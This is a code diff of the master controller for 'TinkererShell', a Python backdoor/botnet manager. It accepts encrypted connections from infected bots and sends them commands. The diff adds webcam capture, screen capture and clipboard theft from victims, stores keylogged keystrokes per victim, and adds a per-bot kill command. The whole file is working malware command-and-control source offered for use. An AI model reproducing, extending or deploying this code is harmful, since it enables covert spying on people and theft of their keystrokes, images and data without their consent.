@@ -1,28 +1,29 @@
-#!/usr/bin/python
+#!/usr/bin/python3.7
 # -*- coding: utf-8 -*-
 """TinkererShell master, a simple bots manager.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
-import cmd
-import datetime
-import json
-import os
 import sys
+
+sys.path.append('./modules/')
+import datetime
+import os
+import cmd
 import threading
-import time
-from base64 import b64encode, b64decode
+from time import sleep
+from base64 import b64decode
 from random import randrange
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, timeout
 
-# pycryptodome
-# noinspection PyPackageRequirements
-from Crypto.Cipher import AES
+from my_crypt_func import encode_aes, decode_aes
+from my_logger import logging
 
 connected_sockets = []
 active_bot = 1000
 thr_exit = threading.Event()
 
 
+# noinspection PyUnboundLocalVariable
 def connection_gate():
     """Thread that keep accepting new bots, assigning ports, and passing them to other threads doing keep-alive.\n"""
     host = ''
@@ -49,6 +50,7 @@ def connection_gate():
                 pass
         if thr_exit.isSet():
             break
+        # noinspection PyUnboundLocalVariable
         lengthcrypt = conn_gate.recv(1024).decode('utf-8')
         expected_length = int(decode_aes(lengthcrypt))
         encrypted_received_data: str = ''
@@ -66,7 +68,7 @@ def connection_gate():
                 # Send encrypted data's length encrypted
                 conn_gate.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
-                time.sleep(1)
+                sleep(1)
                 # Send encrypted data
                 conn_gate.send(bytes(encrypted, 'utf-8'))
                 threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
@@ -106,26 +108,13 @@ def handler(new_so, new_port, username):
                 # Send encrypted data's length encrypted
                 conn_handler.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
                 # Sleep 1 second to let the receiver decrypt the length packet.
-                time.sleep(1)
+                sleep(1)
                 # Send encrypted data
                 conn_handler.send(bytes(encrypted, 'utf-8'))
-            time.sleep(60)
+            sleep(60)
             if thr_exit.isSet():
                 break
     conn_handler.close()
-
-
-def logging(data_to_log: str, printer=False) -> bool:
-    """Log data passed as argument and if needed print it also to the console.\n"""
-    if printer is True:
-        print(data_to_log)
-    try:
-        log_descriptor = open('sessionlog.txt', 'a')
-        log_descriptor.write('\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n' + data_to_log)
-        log_descriptor.close()
-    except Exception as exception_logging:
-        print(exception_logging)
-    return True
 
 
 def sender(data_to_send: str) -> bool:
@@ -137,7 +126,7 @@ def sender(data_to_send: str) -> bool:
     # Send encrypted data's length encrypted
     conn.send(bytes(encode_aes(str(len(encrypted))), 'utf-8'))
     # Sleep 1 second to let the receiver decrypt the length packet.
-    time.sleep(1)
+    sleep(1)
     # Send encrypted data
     conn.send(bytes(encrypted, 'utf-8'))
     return True
@@ -215,6 +204,66 @@ def uploader() -> bool:
     return True
 
 
+def screenshot() -> bool:
+    """Take a full screen screenshot from the bot.\n"""
+    sender('SHscreenshot')
+    received_file_data = b64decode(receiver())
+    if received_file_data != 'reachedexcept':
+        counter = 0
+        while True:
+            local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
+                                                              connected_sockets[active_bot]['username'], str(counter))
+            if not os.path.isfile(local_filename):
+                break
+            counter += 1
+        try:
+            downloaded_file_descriptor = open(local_filename, 'wb')
+            downloaded_file_descriptor.write(received_file_data)
+            downloaded_file_descriptor.close()
+            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
+        except Exception as exception_downloader:
+            logging(data_to_log=str(exception_downloader), printer=True)
+    else:
+        remote_exception = receiver()
+        logging(
+            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
+            printer=True)
+    return True
+
+
+def webcam_pic() -> bool:
+    """Take a full screen screenshot from the bot.\n"""
+    sender('SHwebcampic')
+    received_file_data = b64decode(receiver())
+    if received_file_data != 'reachedexcept':
+        counter = 0
+        while True:
+            local_filename = 'webcam-pic-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
+                                                              connected_sockets[active_bot]['username'], str(counter))
+            if not os.path.isfile(local_filename):
+                break
+            counter += 1
+        try:
+            downloaded_file_descriptor = open(local_filename, 'wb')
+            downloaded_file_descriptor.write(received_file_data)
+            downloaded_file_descriptor.close()
+            logging(data_to_log=('Screenshot saved as ' + local_filename + '\n'), printer=True)
+        except Exception as exception_downloader:
+            logging(data_to_log=str(exception_downloader), printer=True)
+    else:
+        remote_exception = receiver()
+        logging(
+            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
+            printer=True)
+    return True
+
+
+def clip_copy():
+    """Download clipboard content from bot.\n"""
+    sender('SHclipboard')
+    receiver(printer=True)
+
+
 def processkiller():
     """Kill a process.\n"""
     sender('SHprocesskill')
@@ -237,11 +286,13 @@ def keylogdownloader():
     """Download keystrokes logged by keylogger.\n"""
     sender('SHkeylogdownload')
     keylogged_data = receiver()
+    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
+                                                  connected_sockets[active_bot]['username'])
     if keylogged_data == 'reachedexcept':
         receiver(printer=True)
     else:
         try:
-            keylogged_descriptor = open('keylogged.txt', 'a')
+            keylogged_descriptor = open(local_filename, 'a')
             keylogged_descriptor.write(keylogged_data)
             keylogged_descriptor.close()
             logging(data_to_log='Download completed!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
@@ -251,12 +302,15 @@ def keylogdownloader():
 
 def keylogshower():
     """Show downloaded keystrokes in a tk window.\n"""
+    local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
+                                                  connected_sockets[active_bot]['username'])
     try:
-        keylogged_descriptor = open('keylogged.txt', 'r')
+        keylogged_descriptor = open(local_filename, 'r')
         print(keylogged_descriptor.read())
         keylogged_descriptor.close()
     except IOError as exception_keylogshower:
         if exception_keylogshower.errno == 2:
+            # noinspection PyPep8
             logging(
                 data_to_log='It looks like you never downloaded keylogged data from bot!\n Going to download it now for you...\n',
                 printer=True)
@@ -266,55 +320,48 @@ def keylogshower():
             logging(data_to_log=str(exception_keylogshower), printer=True)
 
 
-def quit_utility() -> bool:
+def kill_current_bot() -> bool:
     # noinspection PyPep8
-    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
-    global conn
-    global thr_exit
+    """Terminate remote backdoor thread.\n"""
+    global connected_sockets
     double_check = ask_input(phrase='Are you sure? yes/no\n')
-    kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
     if double_check == 'yes':
-        for bot in connected_sockets:
-            conn = bot['conn']
-            if kill_all == 'yes':
-                sender('SHkill')
-            else:
-                sender('SHquit')
-            response = receiver()
-            if response == 'mistochiudendo':
-                pass
-            else:
-                logging(data_to_log=response, printer=True)
-        thr_exit.set()
+        sender('SHkill')
+        response = receiver()
+        if response == 'mistochiudendo':
+            pass
+        else:
+            logging(data_to_log=response, printer=True)
+        connected_sockets[active_bot]['status'] = False
         return True
     logging(data_to_log='Operation aborted\n', printer=True)
     return False
 
 
-def encode_aes(text_input: str) -> str:
-    """Encode a string and output an json in string form.\n"""
-    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
-    lista = [ciphertext, tag, cipher.nonce]
-    json_k = ['ciphertext', 'tag', 'nonce']
-    json_v = [b64encode(x).decode('utf-8') for x in lista]
-    return json.dumps(dict(zip(json_k, json_v)))
-
-
-def decode_aes(json_input: str) -> str:
-    """Decode a string in json form and output a string.\n"""
-    try:
-        b64 = json.loads(json_input)
-        json_k = ['ciphertext', 'tag', 'nonce']
-        jv = {k: b64decode(b64[k]) for k in json_k}
-        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
-        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
-        return cleared
-    except Exception as exception_decode:
-        print(exception_decode)
-        print("Incorrect decryption")
+def quit_utility() -> bool:
+    # noinspection PyPep8
+    """Ask if user wants to terminate backdoor threads in connected bots and kill them, then exits.\n"""
+    global conn
+    global thr_exit
+    double_check = ask_input(phrase='Are you sure? yes/no\n')
+    if double_check == 'yes':
+        kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
+        for bot in connected_sockets:
+            if bot['status'] is True:
+                conn = bot['conn']
+                if kill_all == 'yes':
+                    sender('SHkill')
+                else:
+                    sender('SHquit')
+                response = receiver()
+                if response == 'mistochiudendo':
+                    pass
+                else:
+                    logging(data_to_log=response, printer=True)
+        thr_exit.set()
+        return True
+    logging(data_to_log='Operation aborted\n', printer=True)
+    return False
 
 
 def command_executer():
@@ -336,36 +383,39 @@ class BotSwitcher(cmd.Cmd):
 
     # ---------------------------------------------------------------------------------------------
     def do_SHbots(self, option):
-        """SHbots\n\tList connected bots.\n"""
-        printable_bots = 'Listing bots...'
-        for bots_counter, bot in enumerate(connected_sockets):
-            if bot['status'] is True:
-                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
-        logging(data_to_log=printable_bots, printer=True)
-
-    # ---------------------------------------------------------------------------------------------
-    def default(self, command):
+        """SHbots [option]\n\tlist: List connected bots\n\t[bot number]: Interact with target bot\n"""
         global active_bot
         global conn
-        if command.isdigit() is True:
-            try:
-                if connected_sockets[int(command)]['status'] is True:
-                    double_check = ask_input(phrase='Are you sure? yes/no\n')
-                    if double_check == 'yes':
-                        active_bot = int(command)
-                        conn = connected_sockets[int(command)]['conn']
-                        tinkerer_menu()
+        if option:
+            if option == 'list':
+                active_bots_str = '\nActive bots:'
+                inactive_bots_str = '\n\nInactive bots:'
+                for bots_counter, bot in enumerate(connected_sockets):
+                    if bot['status'] is True:
+                        active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                     else:
-                        logging(data_to_log='Selection canceled\n', printer=True)
-            except Exception as exception_default:
-                if str(exception_default) == 'list index out of range':
-                    logging(data_to_log='The selected bot does not exist\n', printer=True)
-                else:
-                    logging(data_to_log=str(exception_default), printer=True)
+                        inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
+                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot using "SHbots [bot-number]"\n'
+                logging(data_to_log=printable_bots, printer=True)
+            elif option.isdigit() is True:
+                try:
+                    if connected_sockets[int(option)]['status'] is True:
+                        double_check = ask_input(phrase='Are you sure? yes/no\n')
+                        if double_check == 'yes':
+                            active_bot = int(option)
+                            conn = connected_sockets[int(option)]['conn']
+                            tinkerer_menu()
+                        else:
+                            logging(data_to_log='Selection canceled\n', printer=True)
+                except Exception as exception_default:
+                    if str(exception_default) == 'list index out of range':
+                        logging(data_to_log='The selected bot does not exist\n', printer=True)
+                    else:
+                        logging(data_to_log=str(exception_default), printer=True)
             else:
-                pass
+                print('Aborted: unknown option\n')
         else:
-            pass
+            print('Aborted: an option is required\n')
 
     # ---------------------------------------------------------------------------------------------
     def do_SHquit(self, option) -> bool:
@@ -416,12 +466,14 @@ class CommandExecutorInput(cmd.Cmd):
 
 
 # =================================================================================================
+# noinspection PyMethodMayBeStatic
 class TinkererShellInput(cmd.Cmd):
     """TinkererShell.\n"""
 
     prompt = '\n(SHCmd) '
 
     # ---------------------------------------------------------------------------------------------
+    # noinspection PyMethodMayBeStatic
     def do_SHprocess(self, option):
         """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
         if option:
@@ -474,6 +526,24 @@ class TinkererShellInput(cmd.Cmd):
 
     # ---------------------------------------------------------------------------------------------
     # noinspection PyUnusedLocal
+    def do_SHscreenshot(self, option):
+        """SHscreenshot\n\tGrab a screenshot of the whole screen (multiple monitors supported)\n"""
+        screenshot()
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
+    def do_SHwebcampic(self, option):
+        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
+        webcam_pic()
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
+    def do_SHclipboard(self, option):
+        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
+        clip_copy()
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
     def do_SHdownload(self, option):
         """SHdownload\n\tDownload a file\n"""
         downloader()
@@ -513,6 +583,11 @@ class TinkererShellInput(cmd.Cmd):
         logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
         return True
 
+    # noinspection PyUnusedLocal
+    def do_SHkill(self, option):
+        """SHkill\n\tKill current bot and return to TinkererShell bot selection mode.\n"""
+        return kill_current_bot()
+
     # ---------------------------------------------------------------------------------------------
     def emptyline(self):
         pass
@@ -543,6 +618,6 @@ if __name__ == '__main__':
 
     threading.Thread(target=connection_gate).start()
 
-    time.sleep(5)
+    sleep(5)
     # Start command loop
     BotSwitcher().cmdloop()
